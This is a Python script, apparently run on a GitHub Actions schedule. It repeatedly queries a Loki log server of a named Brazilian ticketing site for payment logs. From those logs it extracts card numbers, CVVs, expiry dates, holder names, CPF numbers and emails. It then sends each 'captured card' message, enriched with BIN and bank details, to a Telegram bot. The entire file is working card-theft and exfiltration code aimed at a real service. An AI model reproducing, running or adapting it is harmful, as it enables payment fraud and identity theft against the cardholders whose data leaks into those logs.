#!/usr/bin/env python3
"""Loki card capture — roda em GitHub Actions (sem VPS, sem host local).

Cron a cada 5 min; cada execucao faz polling de ~4 min e sai.
Estado (PANs ja vistos) fica em state.json, commitado pelo workflow.
"""
import urllib.request, urllib.parse, json, time, re, sys, os, ssl, gzip

LOKI = os.environ.get("LOKI_BASE", "https://loki.minhaentrada.com.br") + "/loki/api/v1/query_range"
TG_TOKEN = os.environ["TG_TOKEN"]
TG_CHAT_ID = os.environ["TG_CHAT_ID"]

LOOKBACK_MIN = int(os.environ.get("LOOKBACK_MIN", "20"))
RUN_SECONDS = int(os.environ.get("RUN_SECONDS", "240"))
INTERVAL = int(os.environ.get("INTERVAL", "10"))
STATE = "state.bin"
BINDIR = "binlist.tsv.gz"
STATE_KEY = os.environ.get("STATE_KEY", "")


def _fernet():
    from cryptography.fernet import Fernet
    return Fernet(STATE_KEY.encode())

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
TG_CTX = ssl.create_default_context()

QUERIES = [
    '{container="meticketeira"}|~"megateway"',
    '{container=~".+"}|~"cvv"',
]

RE_PAN = re.compile(r'"number"\s*:\s*"(\d{13,19})"')
RE_CVV = re.compile(r'"cvv"\s*:\s*"(\d{3,4})"')
RE_M = re.compile(r'"expireMonth"\s*:\s*"?(\d{1,2})')
RE_Y = re.compile(r'"expireYear"\s*:\s*"?(\d{4})')
RE_HOLDER = re.compile(r'"name"\s*:\s*"([^"]{3,60})"')
RE_CPF = re.compile(r'"number"\s*:\s*"(\d{11})"')
RE_EMAIL = re.compile(r'"email"\s*:\s*"([^"]{5,80})"')
RE_AMOUNT = re.compile(r'"amount"\s*:\s*"?([\d.]+)')
RE_EVENT = re.compile(r'"description"\s*:\s*"([^"]{3,70})"')
RE_REF = re.compile(r'"reference"\s*:\s*"(\d+)"')
RE_INST = re.compile(r'"installments"\s*:\s*(\d+)')
RE_TID = re.compile(r'"tid"\s*:\s*"([^"]+)"')

bin_db = {}


def load_bins():
    if not os.path.exists(BINDIR):
        return
    with gzip.open(BINDIR, "rt", encoding="utf-8", errors="replace") as f:
        for line in f:
            p = line.rstrip("\n").split("\t")
            if len(p) >= 7 and p[0].strip().isdigit():
                bin_db[p[0].strip()] = (p[1], p[2], p[4], p[6])


def lookup_bin(pan):
    for n in (8, 7, 6):
        if pan[:n] in bin_db:
            return bin_db[pan[:n]]
    return ("?", "?", "?", "?")


def load_state():
    try:
        if STATE_KEY and os.path.exists(STATE):
            raw = _fernet().decrypt(open(STATE, "rb").read())
            return set(json.loads(raw))
        with open("state.json") as f:
            return set(json.load(f))
    except Exception:
        return set()


def save_state(s):
    payload = json.dumps(sorted(s)).encode()
    if STATE_KEY:
        open(STATE, "wb").write(_fernet().encrypt(payload))
    else:
        open("state.json", "w").write(payload.decode())


def fetch(q, start_ns, end_ns):
    u = f"{LOKI}?{urllib.parse.urlencode({'query': q, 'start': start_ns, 'end': end_ns, 'limit': 5000, 'direction': 'backward'})}"
    req = urllib.request.Request(u, headers={"User-Agent": "loki-capture"})
    with urllib.request.urlopen(req, timeout=60, context=CTX) as r:
        return json.load(r).get("data", {}).get("result", [])


def extract(line):
    mp, mc = RE_PAN.search(line), RE_CVV.search(line)
    if not mp or not mc:
        return None
    mm, my = RE_M.search(line), RE_Y.search(line)
    if not mm or not my:
        return None
    g = lambda rx: rx.search(line).group(1) if rx.search(line) else ""
    return {
        "pan": mp.group(1), "cvv": mc.group(1),
        "exp": f"{int(mm.group(1)):02d}/{my.group(1)}",
        "holder": g(RE_HOLDER), "cpf": g(RE_CPF), "email": g(RE_EMAIL),
        "amount": g(RE_AMOUNT), "event": g(RE_EVENT), "ref": g(RE_REF),
        "inst": g(RE_INST), "tid": g(RE_TID),
    }


def esc(s):
    return (s or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def send(c, n):
    brand, ctype, issuer, country = lookup_bin(c["pan"])
    try:
        v = f"R$ {float(c['amount']):,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
    except Exception:
        v = "N/A"
    msg = (
        f"🎯 <b>Novo CC Capturado (#{n})</b>\n\n"
        f"💳 <b>PAN:</b> <code>{c['pan']}</code>\n"
        f"🔒 <b>CVV:</b> <code>{c['cvv']}</code>\n"
        f"📅 <b>EXP:</b> <code>{c['exp']}</code>\n\n"
        f"🏦 <b>BIN:</b> {brand} {ctype}\n"
        f"🏛 <b>Banco:</b> {esc(issuer)}\n"
        f"🌍 <b>País:</b> {esc(country)}\n\n"
        f"👤 <b>Nome:</b> <code>{esc(c['holder'])}</code>\n"
        f"🆔 <b>CPF:</b> <code>{c['cpf'] or 'N/A'}</code>\n"
        f"📧 <b>Email:</b> <code>{esc(c['email'])}</code>\n\n"
        f"🎫 <b>Evento:</b> {esc(c['event'])}\n"
        f"💰 <b>Valor:</b> {v} · {c['inst'] or '-'}x\n"
        f"📦 <b>Pedido:</b> {c['ref'] or '-'}\n"
        f"⏱ <b>UTC:</b> {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())}"
    )
    data = urllib.parse.urlencode({"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML"}).encode()
    req = urllib.request.Request(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", data=data)
    for _ in range(3):
        try:
            with urllib.request.urlopen(req, timeout=20, context=TG_CTX) as r:
                if json.load(r).get("ok"):
                    return True
            return False
        except urllib.error.HTTPError as e:
            if e.code == 429:
                time.sleep(int(json.loads(e.read()).get("parameters", {}).get("retry_after", 5)) + 1)
                continue
            return False
        except Exception:
            time.sleep(3)
    return False


def main():
    load_bins()
    seen = load_state()
    print(f"[+] bins={len(bin_db)} known={len(seen)}", flush=True)
    sent = 0
    deadline = time.time() + RUN_SECONDS
    while time.time() < deadline:
        now = time.time_ns()
        start = now - LOOKBACK_MIN * 60 * 1_000_000_000
        batch = []
        for q in QUERIES:
            try:
                for s in fetch(q, start, now):
                    for ts, line in s.get("values", []):
                        c = extract(line)
                        if not c:
                            continue
                        k = f"{c['pan']}|{c['cvv']}"
                        if k in seen:
                            continue
                        seen.add(k)
                        batch.append(c)
            except Exception as e:
                print(f"[!] query: {e}", flush=True)
        # envia do mais antigo para o mais novo
        for c in reversed(batch):
            if send(c, len(seen)):
                sent += 1
                time.sleep(1.2)
        if batch:
            print(f"[+] +{len(batch)} novos (total {sent})", flush=True)
        save_state(seen)
        time.sleep(INTERVAL)
    save_state(seen)
    print(f"[+] fim: enviados={sent} conhecidos={len(seen)}", flush=True)


if __name__ == "__main__":
    main()
